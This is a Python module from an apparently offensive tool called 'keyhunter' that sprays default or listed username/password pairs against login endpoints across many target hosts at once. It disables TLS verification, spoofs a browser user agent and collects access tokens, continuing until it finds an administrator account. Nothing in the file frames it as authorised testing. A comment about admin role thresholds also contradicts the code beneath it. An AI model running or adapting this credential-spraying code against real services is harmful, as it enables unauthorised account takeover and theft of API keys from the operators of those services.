from __future__ import annotations

from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any

import httpx

from keyhunter.config import BROWSER_USER_AGENT, Settings
from keyhunter.products import ProductProfile


def _client(settings: Settings) -> httpx.Client:
    return httpx.Client(
        timeout=settings.timeout,
        proxy=settings.proxy,
        follow_redirects=True,
        verify=False,
        headers={"User-Agent": BROWSER_USER_AGENT},
    )


def _extract_token(payload: Any) -> str | None:
    if not isinstance(payload, dict):
        return None
    for key in ("access_token", "token", "data"):
        val = payload.get(key)
        if isinstance(val, str) and val:
            return val
        if isinstance(val, dict):
            nested = _extract_token(val)
            if nested:
                return nested
    data = payload.get("data")
    if isinstance(data, dict):
        return _extract_token(data)
    return None


def _extract_user_id(payload: Any) -> str | None:
    if not isinstance(payload, dict):
        return None
    candidates: list[Any] = [payload, payload.get("data"), payload.get("user")]
    data = payload.get("data")
    if isinstance(data, dict):
        candidates.append(data.get("user"))
    for obj in candidates:
        if not isinstance(obj, dict):
            continue
        for key in ("id", "user_id", "userId"):
            if obj.get(key) is not None:
                return str(obj[key])
    return None


def _is_admin(payload: Any) -> bool | None:
    if not isinstance(payload, dict):
        return None
    candidates: list[Any] = [payload.get("user"), payload]
    data = payload.get("data")
    if isinstance(data, dict):
        candidates.extend([data.get("user"), data])
    for user in candidates:
        if not isinstance(user, dict):
            continue
        role = user.get("role")
        if isinstance(role, int):
            # New-API: role >= 100 typically admin/root
            return role >= 10
        role_s = str(role or "").lower()
        if role_s:
            return role_s in {"admin", "root", "super", "administrator"}
    return None


def try_login(
    origin: str,
    user: str,
    password: str,
    product: ProductProfile,
    settings: Settings,
    http: httpx.Client | None = None,
) -> dict[str, Any]:
    owns = http is None
    client = http or _client(settings)
    url = f"{origin.rstrip('/')}{product.login_path}"
    body: dict[str, Any] = {
        product.login_user_field: user,
        "password": password,
        **dict(product.extra_login_fields),
    }
    result: dict[str, Any] = {
        "origin": origin.rstrip("/"),
        "product": product.id,
        "user": user,
        "email": user,  # keep alias for older summaries
        "ok": False,
        "status": None,
        "access_token": None,
        "user_id": None,
        "admin": None,
    }
    try:
        resp = client.post(url, json=body)
        result["status"] = resp.status_code
        try:
            payload = resp.json()
        except ValueError:
            payload = None
        # New-API often returns {"success": false, ...} with HTTP 200
        if isinstance(payload, dict) and payload.get("success") is False:
            result["ok"] = False
            return result
        token = _extract_token(payload)
        if resp.status_code < 400 and token:
            result["ok"] = True
            result["access_token"] = token
            result["user_id"] = _extract_user_id(payload)
            result["admin"] = _is_admin(payload)
            result["raw_keys"] = (
                sorted(payload.keys()) if isinstance(payload, dict) else []
            )
    except httpx.HTTPError as exc:
        result["error"] = type(exc).__name__
    finally:
        if owns:
            client.close()
    return result


def spray_target(
    origin: str,
    product: ProductProfile,
    settings: Settings,
    max_attempts: int | None = None,
) -> dict[str, Any]:
    """Try ordered pairs, continuing past explicitly non-admin sessions."""
    pairs = product.credential_pairs()
    attempt_limit = len(pairs) if max_attempts is None else max(0, max_attempts)
    attempts = 0
    tried: list[dict[str, Any]] = []
    non_admin_hits = 0
    with _client(settings) as client:
        for user, password in pairs:
            if attempts >= attempt_limit:
                return {
                    "origin": origin.rstrip("/"),
                    "product": product.id,
                    "ok": False,
                    "attempts": attempts,
                    "reason": "max_attempts",
                    "pair_budget": len(pairs),
                    "non_admin_hits": non_admin_hits,
                    "tried": tried[-50:],
                }
            attempts += 1
            hit = try_login(origin, user, password, product, settings, client)
            tried.append(
                {
                    "user": user,
                    "status": hit.get("status"),
                    "ok": hit.get("ok"),
                    "admin": hit.get("admin"),
                }
            )
            if hit.get("ok") and hit.get("admin") is False:
                non_admin_hits += 1
                continue
            if hit.get("ok"):
                return {
                    "origin": origin.rstrip("/"),
                    "product": product.id,
                    "ok": True,
                    "user": user,
                    "email": user,
                    "access_token": hit["access_token"],
                    "user_id": hit.get("user_id"),
                    "admin": hit.get("admin"),
                    "attempts": attempts,
                    "pair_budget": len(pairs),
                    "non_admin_hits": non_admin_hits,
                    "tried": tried[-50:],
                }
    return {
        "origin": origin.rstrip("/"),
        "product": product.id,
        "ok": False,
        "attempts": attempts,
        "reason": "exhausted",
        "pair_budget": len(pairs),
        "non_admin_hits": non_admin_hits,
        "tried": tried[-50:],
    }


def spray_many(
    origins: list[str],
    product: ProductProfile,
    settings: Settings,
    max_attempts: int | None = None,
) -> list[dict[str, Any]]:
    results: list[dict[str, Any]] = []
    with ThreadPoolExecutor(max_workers=settings.concurrency) as pool:
        futures = [
            pool.submit(spray_target, origin, product, settings, max_attempts)
            for origin in origins
        ]
        for future in as_completed(futures):
            results.append(future.result())
    results.sort(key=lambda item: str(item.get("origin") or ""))
    return results
